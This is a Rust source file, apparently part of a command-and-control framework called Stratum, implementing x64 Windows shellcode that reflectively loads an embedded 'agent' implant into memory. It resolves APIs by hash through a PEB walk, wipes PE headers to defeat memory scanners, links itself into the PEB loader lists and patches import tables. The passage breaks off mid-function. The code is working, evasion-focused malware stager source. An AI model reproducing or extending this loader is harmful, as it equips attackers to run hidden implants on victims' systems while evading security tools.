/*!
 * x64 Windows position-independent shellcode — reflective PE loader.
 *
 * Loads the embedded native Rust agent EXE directly into memory without
 * touching disk or spawning any interpreter process.
 *
 * Execution sequence:
 *   _start → CreateThread(agent_thread) → returns immediately
 *   agent_thread:
 *     1. Resolve kernel32 + ntdll via PEB walk
 *     2. Resolve required Win32 APIs via ROR13 export hash scan
 *     3. VirtualAlloc(RW)  — allocate image-sized region
 *     4. Copy PE headers + sections to their virtual addresses
 *     5. Apply base relocations (.reloc section)
 *     6. Resolve import table (IAT) — LoadLibraryA + GetProcAddress
 *     7. VirtualProtect per-section — RX for .text, RW for .data, etc.
 *     8. Wipe PE header — zero first 0x1000 bytes to defeat memory scanners
 *     9. Call TLS callbacks (if any)
 *    10. Resolve AGENT_THREAD_HANDLE export addr (before header wipe)
 *    11. Wipe PE header
 *    12. Call OEP (_DllMainCRTStartup) — inits CRT; DllMain spawns agent thread, stores HANDLE
 *    13. WaitForSingleObject(agent_thread) — blocks shellcode thread for implant lifetime
 *
 * API resolution: PEB walk to find kernel32/ntdll base, then ROR13 hash scan
 * over the export directory. No imports, no relocations in the loader itself.
 *
 * The embedded PE is the compiled agent.exe (MSVC-ABI, x86_64-pc-windows-msvc)
 * built by the Stratum wizard and pointed to by STRATUM_PE_PATH at compile time.
 */
#![no_std]
#![no_main]
#![allow(non_snake_case, non_camel_case_types, clippy::missing_safety_doc)]

use core::arch::asm;
use core::ffi::c_void;
use core::mem;
use core::ptr;

// ── embedded PE payload ───────────────────────────────────────────────────────
const PE_DATA: &[u8] = include_bytes!(env!("STRATUM_PE_PATH"));

// ── Win32 primitive types ─────────────────────────────────────────────────────
type Handle  = *mut c_void;
type Bool    = i32;
type Dword   = u32;
type Word    = u16;
type LpVoid  = *mut c_void;
type ULongPtr = usize;

// ── PE structures ─────────────────────────────────────────────────────────────

#[repr(C)]
struct ImageDosHeader {
    e_magic:    Word,   // 0x5A4D "MZ"
    _pad:       [Word; 29],
    e_lfanew:   i32,    // offset to IMAGE_NT_HEADERS
}

#[repr(C)]
struct ImageFileHeader {
    machine:               Word,
    number_of_sections:    Word,
    time_date_stamp:       Dword,
    pointer_to_symbol_table: Dword,
    number_of_symbols:     Dword,
    size_of_optional_header: Word,
    characteristics:       Word,
}

#[repr(C)]
struct ImageOptionalHeader64 {
    magic:                        Word,
    major_linker_version:         u8,
    minor_linker_version:         u8,
    size_of_code:                 Dword,
    size_of_initialized_data:     Dword,
    size_of_uninitialized_data:   Dword,
    address_of_entry_point:       Dword,
    base_of_code:                 Dword,
    image_base:                   u64,
    section_alignment:            Dword,
    file_alignment:               Dword,
    _version_fields:              [Word; 6], // MajorOS+MinorOS+MajorImg+MinorImg+MajorSub+MinorSub
    _win32_version_value:         Dword,     // reserved, must be 0
    size_of_image:                Dword,
    size_of_headers:              Dword,
    check_sum:                    Dword,
    subsystem:                    Word,
    dll_characteristics:          Word,
    _stack_reserve:               u64,
    _stack_commit:                u64,
    _heap_reserve:                u64,
    _heap_commit:                 u64,
    _loader_flags:                Dword,
    number_of_rva_and_sizes:      Dword,
    data_directory:               [ImageDataDirectory; 16],
}

#[repr(C)]
#[derive(Copy, Clone)]
struct ImageDataDirectory {
    virtual_address: Dword,
    size:            Dword,
}

#[repr(C)]
struct ImageNtHeaders64 {
    signature:       Dword,   // 0x4550 "PE\0\0"
    file_header:     ImageFileHeader,
    optional_header: ImageOptionalHeader64,
}

#[repr(C)]
struct ImageSectionHeader {
    name:                    [u8; 8],
    virtual_size:            Dword,
    virtual_address:         Dword,
    size_of_raw_data:        Dword,
    pointer_to_raw_data:     Dword,
    _pointer_to_relocations: Dword,
    _pointer_to_linenumbers: Dword,
    _number_of_relocations:  Word,
    _number_of_linenumbers:  Word,
    characteristics:         Dword,
}

// Section characteristic flags
const IMAGE_SCN_MEM_EXECUTE: Dword = 0x2000_0000;
const IMAGE_SCN_MEM_WRITE:   Dword = 0x8000_0000;

// Data directory indices
const IMAGE_DIRECTORY_ENTRY_IMPORT:   usize = 1;
const IMAGE_DIRECTORY_ENTRY_BASERELOC: usize = 5;
const IMAGE_DIRECTORY_ENTRY_TLS:      usize = 9;

// VirtualProtect flags
const PAGE_READWRITE:          Dword = 0x04;
const PAGE_EXECUTE_READ:       Dword = 0x20;
const PAGE_EXECUTE_READWRITE:  Dword = 0x40;

// VirtualAlloc flags
const MEM_COMMIT_RESERVE: Dword = 0x3000;

// DllMain reason
const DLL_PROCESS_ATTACH: Dword = 1;

#[repr(C)]
struct ImageImportDescriptor {
    original_first_thunk: Dword,  // RVA to IMAGE_THUNK_DATA array (hint/name)
    time_date_stamp:      Dword,
    forwarder_chain:      Dword,
    name:                 Dword,  // RVA to DLL name string
    first_thunk:          Dword,  // RVA to IAT (patched at load time)
}

#[repr(C)]
struct ImageBaseRelocation {
    virtual_address: Dword,
    size_of_block:   Dword,
    // followed by Word[] type_offset entries
}

#[repr(C)]
struct ImageTlsDirectory64 {
    start_address_of_raw_data: u64,
    end_address_of_raw_data:   u64,
    address_of_index:          u64,
    address_of_callbacks:      u64,   // pointer to array of callback pointers (null-terminated)
    size_of_zero_fill:         Dword,
    characteristics:           Dword,
}

// ── Win32 function pointer types ──────────────────────────────────────────────
// CRITICAL: Use extern "win64" — NOT extern "system" or extern "C".
// On x86_64-unknown-none (bare metal), both "system" and "C" compile to System V ABI
// (RDI/RSI/RDX/RCX). Windows APIs require Win64 ABI (RCX/RDX/R8/R9).
// "win64" is an explicit LLVM ABI string that works regardless of the host OS.
type FnVirtualAlloc = unsafe extern "win64" fn(
    LpVoid, ULongPtr, Dword, Dword) -> LpVoid;
type FnVirtualProtect = unsafe extern "win64" fn(
    LpVoid, ULongPtr, Dword, *mut Dword) -> Bool;
type FnLoadLibraryA = unsafe extern "win64" fn(*const u8) -> Handle;
type FnGetProcAddress = unsafe extern "win64" fn(Handle, *const u8) -> *const u8;
type FnSleep = unsafe extern "win64" fn(Dword);

type FnDllMain          = unsafe extern "win64" fn(Handle, Dword, LpVoid) -> Bool;
type FnTlsCallback      = unsafe extern "win64" fn(Handle, Dword, LpVoid);
type FnTlsAlloc         = unsafe extern "win64" fn() -> Dword;
type FnHeapAlloc        = unsafe extern "win64" fn(*mut c_void, Dword, ULongPtr) -> *mut c_void;
type FnGetProcessHeap   = unsafe extern "win64" fn() -> *mut c_void;

// ── OutputDebugStringA for loader diagnostics ─────────────────────────────────
// Resolved lazily from kernel32 via ROR13 hash. Used only when STRATUM_SC_DEBUG
// is set at compile time — no-op in production builds.
type FnOutputDebugStringA = unsafe extern "win64" fn(*const u8);
const H_OUTPUT_DEBUG_STRING_A: u32 = api_hash(b"OutputDebugStringA");

// Write a static C-string (null-terminated) to the debugger output channel.
unsafe fn sc_log(k32: *const u8, msg: *const u8) {
    let p = get_proc_by_hash(k32, H_OUTPUT_DEBUG_STRING_A);
    if p.is_null() { return; }
    let ods: FnOutputDebugStringA = mem::transmute(p);
    ods(msg);
}

// ── ROR13 API hashing ─────────────────────────────────────────────────────────
#[inline(always)]
const fn ror13(x: u32) -> u32 { (x >> 13) | (x << 19) }

const fn api_hash(name: &[u8]) -> u32 {
    let mut h = 0u32;
    let mut i = 0;
    while i < name.len() {
        h = ror13(h).wrapping_add(name[i] as u32);
        i += 1;
    }
    h
}

// Pre-computed hashes
const H_VIRTUAL_ALLOC:              u32 = api_hash(b"VirtualAlloc");
const H_VIRTUAL_PROTECT:            u32 = api_hash(b"VirtualProtect");
const H_LOAD_LIBRARY:               u32 = api_hash(b"LoadLibraryA");
const H_GET_PROC_ADDR:              u32 = api_hash(b"GetProcAddress");
const H_TLS_ALLOC:                  u32 = api_hash(b"TlsAlloc");
const H_SLEEP:                      u32 = api_hash(b"Sleep");
const H_CREATE_THREAD:              u32 = api_hash(b"CreateThread");
const H_AGENT_THREAD_HANDLE:        u32 = api_hash(b"AGENT_THREAD_HANDLE");
const H_STRATUM_CRT_INIT:           u32 = api_hash(b"StratumCrtInit");
const H_STRATUM_RUN:                u32 = api_hash(b"StratumRun");
const H_STRATUM_CREATE_THREAD:      u32 = api_hash(b"StratumCreateThread");
const H_NT_CREATE_THREAD_EX:        u32 = api_hash(b"NtCreateThreadEx");
const H_NT_WAIT_FOR_SINGLE_OBJ:     u32 = api_hash(b"NtWaitForSingleObject");
// _beginthreadex IAT hook: same ABI as CreateThread — replace it so tokio/std
// thread spawning bypasses the MSVC CRT (avoids __acrt_flsindex crash).
const H_BEGIN_THREAD_EX:            u32 = api_hash(b"_beginthreadex");
const H_HEAP_ALLOC:                 u32 = api_hash(b"HeapAlloc");
const H_GET_PROCESS_HEAP:           u32 = api_hash(b"GetProcessHeap");
const H_RTL_INIT_UNICODE_STRING:    u32 = api_hash(b"RtlInitUnicodeString");

// ── PEB walk: find module base by name hash ───────────────────────────────────
// PEB at GS:[0x60]. LDR at PEB+0x18. InMemoryOrderModuleList at LDR+0x20.
// node = pointer to InMemoryOrderLinks (offset 0x10 inside LDR_DATA_TABLE_ENTRY).
// Offsets from node (= from InMemoryOrderLinks):
//   +0x20  DllBase                 (entry+0x30)
//   +0x38  FullDllName.Length      (entry+0x48)
//   +0x40  FullDllName.Buffer      (entry+0x50)
//   +0x48  BaseDllName.Length      (entry+0x58)
//   +0x50  BaseDllName.Buffer      (entry+0x60)
// UNICODE_STRING x64: Length(2) + MaximumLength(2) + padding(4) + Buffer*(8)
unsafe fn find_module(name_hash: u32) -> *const u8 {
    let peb: usize;
    asm!("mov {}, gs:[0x60]", out(reg) peb, options(nostack, pure, nomem));

    let ldr  = *((peb + 0x18) as *const usize);
    let head = ldr + 0x20;
    let mut node = *(head as *const usize);

    loop {
        let base     = *((node + 0x20) as *const usize);
        let name_len = *((node + 0x48) as *const u16) as usize;
        let name_buf = *((node + 0x50) as *const usize) as *const u16;

        if base != 0 && !name_buf.is_null() && name_len > 0 {
            let mut h = 0u32;
            let chars = name_len / 2;
            for i in 0..chars {
                let mut c = *name_buf.add(i);
                // uppercase ASCII
                if c >= b'a' as u16 && c <= b'z' as u16 { c -= 0x20; }
                h = ror13(h).wrapping_add(c as u32);
            }
            if h == name_hash { return base as *const u8; }
        }

        node = *(node as *const usize); // Flink
        if node == head { break; }
    }
    ptr::null()
}

// Module name hashes (uppercase)
const MOD_KERNEL32: u32 = api_hash(b"KERNEL32.DLL");
const MOD_NTDLL:    u32 = api_hash(b"NTDLL.DLL");

// ── Export directory scan ─────────────────────────────────────────────────────
unsafe fn get_proc_by_hash(base: *const u8, target: u32) -> *const u8 {
    let pe_off  = *((base as usize + 0x3C) as *const u32) as usize;
    let opt_hdr = base as usize + pe_off + 0x18;
    let exp_rva = *((opt_hdr + 0x70) as *const u32) as usize;
    if exp_rva == 0 { return ptr::null(); }

    let exp     = base as usize + exp_rva;
    let n_names = *((exp + 0x18) as *const u32) as usize;
    let names   = (base as usize + *((exp + 0x20) as *const u32) as usize) as *const u32;
    let ords    = (base as usize + *((exp + 0x24) as *const u32) as usize) as *const u16;
    let funcs   = (base as usize + *((exp + 0x1C) as *const u32) as usize) as *const u32;

    for i in 0..n_names {
        let name_rva = *names.add(i) as usize;
        let name     = (base as usize + name_rva) as *const u8;
        let mut h = 0u32;
        let mut p = name;
        while *p != 0 { h = ror13(h).wrapping_add(*p as u32); p = p.add(1); }
        if h == target {
            let ord      = *ords.add(i) as usize;
            let func_rva = *funcs.add(ord) as usize;
            return (base as usize + func_rva) as *const u8;
        }
    }
    ptr::null()
}

// ── memcpy / memset (no_std, no libc) ────────────────────────────────────────
unsafe fn memcpy_raw(dst: *mut u8, src: *const u8, len: usize) {
    for i in 0..len { *dst.add(i) = *src.add(i); }
}
unsafe fn memset_raw(dst: *mut u8, val: u8, len: usize) {
    for i in 0..len { *dst.add(i) = val; }
}

// Volatile memset — writes that LLVM cannot elide as dead stores.
// Used for security-sensitive zeroing (PE wipe) where the compiler must not
// optimise away writes to memory it considers unreachable after the call.
unsafe fn memset_volatile(dst: *mut u8, val: u8, len: usize) {
    for i in 0..len {
        ptr::write_volatile(dst.add(i), val);
    }
}

// ── Register loaded DLL in PEB loader list ────────────────────────────────────
// Inserting the module into all three LDR doubly-linked lists causes ntdll's
// LdrpInitializeThread to call DLL_THREAD_ATTACH on our module for every new
// thread — exactly what we need so Rust TLS works without per-thread patching.
//
// LDR_DATA_TABLE_ENTRY (x64, simplified):
//   +0x00  InLoadOrderLinks         LIST_ENTRY  (Flink/Blink, 16 bytes)
//   +0x10  InMemoryOrderLinks       LIST_ENTRY
//   +0x20  InInitializationOrderLinks LIST_ENTRY
//   +0x30  DllBase                  *void
//   +0x38  EntryPoint               *void
//   +0x40  SizeOfImage              u32
//   +0x44  pad                      u32
//   +0x48  FullDllName              UNICODE_STRING (len u16, maxlen u16, pad u32, buf *u16)
//   +0x58  BaseDllName              UNICODE_STRING
//   +0x68  Flags                    u32
//   +0x6C  LoadCount                u16
//   +0x6E  ...
//
// UNICODE_STRING layout (x64):
//   +0  Length        u16
//   +2  MaximumLength u16
//   +4  pad           u32
//   +8  Buffer        *u16   (8 bytes total for the pointer on x64)
// struct size = 16 bytes
unsafe fn register_dll_in_peb(
    image_base: *mut c_void,
    image_size: usize,
    entry_point: *mut c_void,
    virtual_alloc: FnVirtualAlloc,
    k32: *const u8,
) {
    sc_log(k32, b"[peb] enter\0".as_ptr());

    // Allocate with VirtualAlloc (already resolved, no new API needed).
    let entry_size = 0x120usize;
    let ldr_entry = virtual_alloc(ptr::null_mut(), entry_size, MEM_COMMIT_RESERVE, PAGE_READWRITE) as *mut u8;
    if ldr_entry.is_null() {
        sc_log(k32, b"[peb] VirtualAlloc failed\0".as_ptr());
        return;
    }
    // VirtualAlloc with MEM_COMMIT already zeros the memory.
    sc_log(k32, b"[peb] VirtualAlloc ok\0".as_ptr());

    // Static wide name — "agent.dll" in UTF-16LE, null-terminated.
    static NAME_W: [u16; 10] = [
        b'a' as u16, b'g' as u16, b'e' as u16, b'n' as u16, b't' as u16,
        b'.' as u16, b'd' as u16, b'l' as u16, b'l' as u16, 0u16,
    ];
    let name_bytes = NAME_W.len() * 2; // 20 bytes including null terminator

    // Copy the name into heap memory right after the entry struct.
    let name_buf = ldr_entry.add(0x100) as *mut u16;
    ptr::copy_nonoverlapping(NAME_W.as_ptr(), name_buf, NAME_W.len());
    sc_log(k32, b"[peb] name copied\0".as_ptr());

    // DllBase (+0x30)
    *(ldr_entry.add(0x30) as *mut usize) = image_base as usize;
    // EntryPoint (+0x38)
    *(ldr_entry.add(0x38) as *mut usize) = entry_point as usize;
    // SizeOfImage (+0x40)
    *(ldr_entry.add(0x40) as *mut u32) = image_size as u32;

    // BaseDllName (+0x58): UNICODE_STRING { Length, MaximumLength, pad, Buffer }
    let name_len = (NAME_W.len() - 1) * 2; // length WITHOUT null (bytes)
    *(ldr_entry.add(0x58) as *mut u16) = name_len as u16;            // Length
    *(ldr_entry.add(0x5A) as *mut u16) = name_bytes as u16;          // MaximumLength
    *(ldr_entry.add(0x60) as *mut usize) = name_buf as usize;        // Buffer

    // FullDllName (+0x48): same for now (no path)
    *(ldr_entry.add(0x48) as *mut u16) = name_len as u16;
    *(ldr_entry.add(0x4A) as *mut u16) = name_bytes as u16;
    *(ldr_entry.add(0x50) as *mut usize) = name_buf as usize;

    // Flags (+0x68): LDRP_IMAGE_DLL (0x4) | LDRP_ENTRY_PROCESSED (0x4000)
    *(ldr_entry.add(0x68) as *mut u32) = 0x0004_4000;
    sc_log(k32, b"[peb] fields set\0".as_ptr());

    // Walk PEB → LDR and insert into all three lists.
    // PEB at GS:[0x60], LDR at PEB+0x18.
    let peb: usize;
    asm!("mov {}, gs:[0x60]", out(reg) peb, options(nostack, pure, nomem));
    sc_log(k32, b"[peb] got PEB\0".as_ptr());
    if peb == 0 { sc_log(k32, b"[peb] ERR null PEB\0".as_ptr()); return; }
    let ldr = *((peb + 0x18) as *const usize);
    sc_log(k32, b"[peb] got LDR\0".as_ptr());
    if ldr == 0 { sc_log(k32, b"[peb] ERR null LDR\0".as_ptr()); return; }

    // Insert into InLoadOrderModuleList (head at ldr+0x10, entry links at +0x00)
    sc_log(k32, b"[peb] list1 start\0".as_ptr());
    {
        let head      = (ldr + 0x10) as *mut usize; // &head.Flink
        let head_blink = (ldr + 0x18) as *mut usize; // &head.Blink
        let old_blink = *head_blink;
        let entry_flink = ldr_entry.add(0x00) as *mut usize;
        let entry_blink = ldr_entry.add(0x08) as *mut usize;
        *entry_flink = head as usize;
        *entry_blink = old_blink;
        *(old_blink as *mut usize) = ldr_entry.add(0x00) as usize; // old_blink.Flink = &entry
        *head_blink = ldr_entry.add(0x00) as usize;
    }
    sc_log(k32, b"[peb] list1 done\0".as_ptr());

    // Insert into InMemoryOrderModuleList (head at ldr+0x20, entry links at +0x10)
    sc_log(k32, b"[peb] list2 start\0".as_ptr());
    {
        let head      = (ldr + 0x20) as *mut usize;
        let head_blink = (ldr + 0x28) as *mut usize;
        let old_blink = *head_blink;
        let entry_flink = ldr_entry.add(0x10) as *mut usize;
        let entry_blink = ldr_entry.add(0x18) as *mut usize;
        *entry_flink = head as usize;
        *entry_blink = old_blink;
        *(old_blink as *mut usize) = ldr_entry.add(0x10) as usize;
        *head_blink = ldr_entry.add(0x10) as usize;
    }
    sc_log(k32, b"[peb] list2 done\0".as_ptr());

    // Insert into InInitializationOrderModuleList (head at ldr+0x30, links at +0x20)
    sc_log(k32, b"[peb] list3 start\0".as_ptr());
    {
        let head      = (ldr + 0x30) as *mut usize;
        let head_blink = (ldr + 0x38) as *mut usize;
        let old_blink = *head_blink;
        let entry_flink = ldr_entry.add(0x20) as *mut usize;
        let entry_blink = ldr_entry.add(0x28) as *mut usize;
        *entry_flink = head as usize;
        *entry_blink = old_blink;
        *(old_blink as *mut usize) = ldr_entry.add(0x20) as usize;
        *head_blink = ldr_entry.add(0x20) as usize;
    }
    sc_log(k32, b"[peb] list3 done\0".as_ptr());

    sc_log(k32, b"[lpe] register_dll_in_peb done\0".as_ptr());
}

// ── Reflective PE loader ──────────────────────────────────────────────────────
unsafe fn load_pe(
    pe: *const u8,
    pe_len: usize,
    k32: *const u8,
    virtual_alloc:    FnVirtualAlloc,
    virtual_protect:  FnVirtualProtect,
    load_library:     FnLoadLibraryA,
    get_proc_addr:    FnGetProcAddress,
    tls_alloc:        FnTlsAlloc,
    sleep_fn:         FnSleep,
    create_thread:    *const u8,   // CreateThread ptr — replaces _beginthreadex in IAT
) -> Dword {
    sc_log(k32, b"[lpe] enter\0".as_ptr());

    // Validate inputs before dereferencing
    if pe.is_null() || pe_len < 64 {
        sc_log(k32, b"[lpe] ERR40 null/small\0".as_ptr());
        return 40;
    }

    // ── 1. Parse PE headers ───────────────────────────────────────────────────
    let dos = &*(pe as *const ImageDosHeader);
    if dos.e_magic != 0x5A4D {
        sc_log(k32, b"[lpe] ERR30 bad MZ\0".as_ptr());
        return 30;
    }
    sc_log(k32, b"[lpe] MZ ok\0".as_ptr());

    let nt  = &*((pe as usize + dos.e_lfanew as usize) as *const ImageNtHeaders64);
    if nt.signature != 0x0000_4550 {
        sc_log(k32, b"[lpe] ERR31 bad PE sig\0".as_ptr());
        return 31;
    }
    sc_log(k32, b"[lpe] PE sig ok\0".as_ptr());

    let opt  = &nt.optional_header;
    let image_size  = opt.size_of_image as usize;
    let preferred   = opt.image_base as usize;

    // ── 2. Allocate memory for the image ─────────────────────────────────────
    // Try preferred base first; fall back to any address (ASLR).
    // VirtualAlloc/VirtualProtect use Win64 ABI via extern "win64" function pointers.
    let mut image_base = virtual_alloc(
        preferred as LpVoid,
        image_size,
        MEM_COMMIT_RESERVE,
        PAGE_READWRITE,
    );
    if image_base.is_null() {
        image_base = virtual_alloc(
            ptr::null_mut(),
            image_size,
            MEM_COMMIT_RESERVE,
            PAGE_READWRITE,
        );
    }
    if image_base.is_null() {
        sc_log(k32, b"[lpe] ERR32 VirtualAlloc failed\0".as_ptr());
        return 32;
    }
    sc_log(k32, b"[lpe] VirtualAlloc ok\0".as_ptr());

    let base = image_base as usize;

    // ── 3. Copy PE headers ────────────────────────────────────────────────────
    let hdr_size = opt.size_of_headers as usize;
    if hdr_size > pe_len {
        sc_log(k32, b"[lpe] ERR33 hdr>pe_len\0".as_ptr());
        return 33;
    }
    memcpy_raw(image_base as *mut u8, pe, hdr_size);
    sc_log(k32, b"[lpe] hdrs copied\0".as_ptr());

    // ── 4. Copy sections ──────────────────────────────────────────────────────
    let n_sections = nt.file_header.number_of_sections as usize;
    let sections_offset = dos.e_lfanew as usize
        + mem::size_of::<Dword>()
        + mem::size_of::<ImageFileHeader>()
        + nt.file_header.size_of_optional_header as usize;
    let sections = (pe as usize + sections_offset) as *const ImageSectionHeader;

    for i in 0..n_sections {
        let sec = &*sections.add(i);
        let raw_size = sec.size_of_raw_data as usize;
        if raw_size == 0 { continue; }
        let src = pe as usize + sec.pointer_to_raw_data as usize;
        let dst = base + sec.virtual_address as usize;
        if src + raw_size > pe as usize + pe_len { continue; }
        memcpy_raw(dst as *mut u8, src as *const u8, raw_size);
    }
    sc_log(k32, b"[lpe] sections copied\0".as_ptr());

    // ── 5. Base relocations ───────────────────────────────────────────────────
    let reloc_dir = opt.data_directory[IMAGE_DIRECTORY_ENTRY_BASERELOC];
    let reloc_rva = reloc_dir.virtual_address as usize;
    let reloc_size = reloc_dir.size as usize;

    if reloc_rva != 0 && reloc_size != 0 {
        let delta = base.wrapping_sub(preferred);
        let mut offset = 0usize;
        while offset < reloc_size {
            let block = &*((base + reloc_rva + offset) as *const ImageBaseRelocation);
            let block_size = block.size_of_block as usize;
            if block_size < 8 { break; }
            let entries = (block_size - 8) / 2;
            let entry_ptr = (base + reloc_rva + offset + 8) as *const Word;
            for e in 0..entries {
                let entry = *entry_ptr.add(e);
                let reloc_type = (entry >> 12) as u32;
                let reloc_off  = (entry & 0x0FFF) as usize;
                if reloc_type == 10 {
                    let target = (base + block.virtual_address as usize + reloc_off) as *mut usize;
                    *target = (*target).wrapping_add(delta);
                }
            }
            offset += block_size;
        }
    }
    sc_log(k32, b"[lpe] relocs done\0".as_ptr());

    // ── 6. Resolve Import Address Table ──────────────────────────────────────
    let import_dir = opt.data_directory[IMAGE_DIRECTORY_ENTRY_IMPORT];
    let import_rva = import_dir.virtual_address as usize;

    if import_rva != 0 {
        let mut desc_ptr = (base + import_rva) as *const ImageImportDescriptor;
        loop {
            let desc = &*desc_ptr;
            if desc.name == 0 && desc.first_thunk == 0 { break; }
            let dll_name = (base + desc.name as usize) as *const u8;
            let dll_handle = load_library(dll_name);
            if dll_handle.is_null() {
                desc_ptr = desc_ptr.add(1);
                continue;
            }
            let mut thunk_rva = if desc.original_first_thunk != 0 {
                desc.original_first_thunk as usize
            } else {
                desc.first_thunk as usize
            };
            let mut iat_rva = desc.first_thunk as usize;
            loop {
                let thunk_val = *((base + thunk_rva) as *const usize);
                if thunk_val == 0 { break; }
                let func_ptr = if thunk_val >> 63 != 0 {
                    let ordinal = (thunk_val & 0xFFFF) as *const u8;
                    get_proc_addr(dll_handle, ordinal)
                } else {
                    let name_ptr = (base + thunk_val + 2) as *const u8;
                    // IAT hook: _beginthreadex → CreateThread.
                    // _beginthreadex(sec, stack, fn, arg, flags, tid) and
                    // CreateThread(sec, stack, fn, arg, flags, tid) share identical
                    // Win64 ABI layout and semantics — replacing one with the other
                    // is transparent to callers (tokio, std::thread::spawn, etc.).
                    // This avoids the __acrt_flsindex ACCESS_VIOLATION that fires
                    // when _beginthreadex is called without CRT initialisation.
                    let mut h = 0u32;
                    let mut p2 = name_ptr;
                    while *p2 != 0 { h = ror13(h).wrapping_add(*p2 as u32); p2 = p2.add(1); }
                    if h == H_BEGIN_THREAD_EX && !create_thread.is_null() {
                        sc_log(k32, b"[lpe] IAT: _beginthreadex->CreateThread\0".as_ptr());
                        create_thread
                    } else {
                        get_proc_addr(dll_handle, name_ptr)
                    }
                };
                let iat_entry = (base + iat_rva) as *mut usize;
                *iat_entry = func_ptr as usize;
                thunk_rva += mem::size_of::<usize>();
                iat_rva   += mem::size_of::<usize>();
            }
            desc_ptr = desc_ptr.add(1);
        }
    }
    sc_log(k32, b"[lpe] IAT resolved\0".as_ptr());

    // ── 7. Set per-section memory protections ─────────────────────────────────
    let mut old_prot: Dword = 0;
    for i in 0..n_sections {
        let sec = &*sections.add(i);
        if sec.virtual_size == 0 && sec.size_of_raw_data == 0 { continue; }
        let sec_va   = base + sec.virtual_address as usize;
        let sec_size = sec.virtual_size.max(sec.size_of_raw_data) as usize;
        let chars    = sec.characteristics;
        let prot = if chars & IMAGE_SCN_MEM_EXECUTE != 0 {
            if chars & IMAGE_SCN_MEM_WRITE != 0 { PAGE_EXECUTE_READWRITE }
            else                                 { PAGE_EXECUTE_READ }
        } else {
            PAGE_READWRITE
        };
        virtual_protect(sec_va as LpVoid, sec_size, prot, &mut old_prot);
    }
    sc_log(k32, b"[lpe] section perms set\0".as_ptr());

    // ── 8. TLS init + callbacks ───────────────────────────────────────────────
    let tls_dir_entry = opt.data_directory[IMAGE_DIRECTORY_ENTRY_TLS];
    if tls_dir_entry.virtual_address != 0 {
        sc_log(k32, b"[lpe] TLS init\0".as_ptr());
        let tls = &*((base + tls_dir_entry.virtual_address as usize)
            as *const ImageTlsDirectory64);
        if tls.address_of_index != 0 {
            let tls_slot = tls_alloc();
            if tls_slot != 0xFFFF_FFFF {
                *(tls.address_of_index as *mut Dword) = tls_slot;
            }
        }
        if tls.address_of_callbacks != 0 {
            sc_log(k32, b"[lpe] TLS callbacks\0".as_ptr());
            let mut cb_ptr = tls.address_of_callbacks as *const usize;
            loop {
                let cb_addr = *cb_ptr;
                if cb_addr == 0 { break; }
                let cb: FnTlsCallback = mem::transmute(cb_addr);
                cb(image_base as Handle, DLL_PROCESS_ATTACH, ptr::null_mut());
                cb_ptr = cb_ptr.add(1);
            }
            sc_log(k32, b"[lpe] TLS callbacks done\0".as_ptr());
        }
    }

    // ── 10. Run .CRT$XI* and .CRT$XC* initializers ───────────────────────────
    // The MSVC CRT groups static initializers into linker sections:
    //   .CRT$XIA / .CRT$XIZ  — C init  (sentinels, empty pointers)
    //   .CRT$XIB..XIY        — actual init functions (Rust runtime init lives here)
    //   .CRT$XCA / .CRT$XCZ  — C++ ctors
    //
    // _DllMainCRTStartup walks these arrays and calls each non-null pointer.
    // Without calling OEP we must do it ourselves so that Rust's panic handler,
    // allocator hooks, and other runtime statics are properly initialised before
    // any Rust code that may panic runs (e.g. reqwest::blocking::ClientBuilder::new).
    //
    // Each entry is a pointer-to-function: void (*)(void)  [C init]
    // or void (__cdecl *)(void)  — same on x64, Win64 ABI.
    type FnCrtInit = unsafe extern "win64" fn();
    for si in 0..n_sections {
        let sec = &*sections.add(si);
        let name = &sec.name;
        // Match .CRT$XI* and .CRT$XC* — 8-byte name field, zero-padded.
        let is_xi = name[0]==b'.' && name[1]==b'C' && name[2]==b'R' && name[3]==b'T'
                 && name[4]==b'$' && name[5]==b'X'
                 && (name[6]==b'I' || name[6]==b'C');
        if !is_xi { continue; }
        let va  = base + sec.virtual_address as usize;
        let sz  = sec.virtual_size.max(sec.size_of_raw_data) as usize;
        let count = sz / mem::size_of::<usize>();
        sc_log(k32, b"[lpe] running .CRT$XI* inits\0".as_ptr());
        for fi in 0..count {
            let fn_ptr = *((va + fi * mem::size_of::<usize>()) as *const usize);
            if fn_ptr == 0 || fn_ptr == usize::MAX { continue; }
            let f: FnCrtInit = mem::transmute(fn_ptr);
            f();
        }
    }
    sc_log(k32, b"[lpe] .CRT$XI* done\0".as_ptr());

    // ── 12. Resolve exports BEFORE header wipe ───────────────────────────────
    let p_ci  = get_proc_by_hash(image_base as *const u8, H_STRATUM_CRT_INIT);
    let p_sr  = get_proc_by_hash(image_base as *const u8, H_STRATUM_RUN);
    let p_sct = get_proc_by_hash(image_base as *const u8, H_STRATUM_CREATE_THREAD);
    let p_ath = get_proc_by_hash(image_base as *const u8, H_AGENT_THREAD_HANDLE);

    // Patch CreateThread in the DLL's own IAT with StratumCreateThread.
    // This must happen AFTER IAT is resolved (step 6) and BEFORE StratumRun
    // so every thread spawned by tokio/reqwest goes through our TLS hook.
    if !p_sct.is_null() {
        sc_log(k32, b"[lpe] patching IAT CreateThread->StratumCreateThread\0".as_ptr());
        // Walk IAT again to find the CreateThread entry and replace it.
        let import_dir2 = opt.data_directory[IMAGE_DIRECTORY_ENTRY_IMPORT];
        if import_dir2.virtual_address != 0 {
            let mut desc_ptr2 = (base + import_dir2.virtual_address as usize) as *const ImageImportDescriptor;
            'outer: loop {
                let desc2 = &*desc_ptr2;
                if desc2.name == 0 && desc2.first_thunk == 0 { break; }
                let mut thunk_rva2 = if desc2.original_first_thunk != 0 {
                    desc2.original_first_thunk as usize
                } else {
                    desc2.first_thunk as usize
                };
                let mut iat_rva2 = desc2.first_thunk as usize;
                loop {
                    let thunk_val2 = *((base + thunk_rva2) as *const usize);
                    if thunk_val2 == 0 { break; }
                    if thunk_val2 >> 63 == 0 {
                        let name_ptr2 = (base + thunk_val2 + 2) as *const u8;
                        let mut h2 = 0u32;
                        let mut p2 = name_ptr2;
                        while *p2 != 0 { h2 = ror13(h2).wrapping_add(*p2 as u32); p2 = p2.add(1); }
                        if h2 == H_CREATE_THREAD {
                            let iat_entry2 = (base + iat_rva2) as *mut usize;
                            // Make writable briefly (section perm may be RX)
                            let mut old2: Dword = 0;
                            virtual_protect(iat_entry2 as LpVoid, 8, PAGE_READWRITE, &mut old2);
                            *iat_entry2 = p_sct as usize;
                            virtual_protect(iat_entry2 as LpVoid, 8, old2, &mut old2);
                            sc_log(k32, b"[lpe] CreateThread IAT patched\0".as_ptr());
                            break 'outer;
                        }
                    }
                    thunk_rva2 += mem::size_of::<usize>();
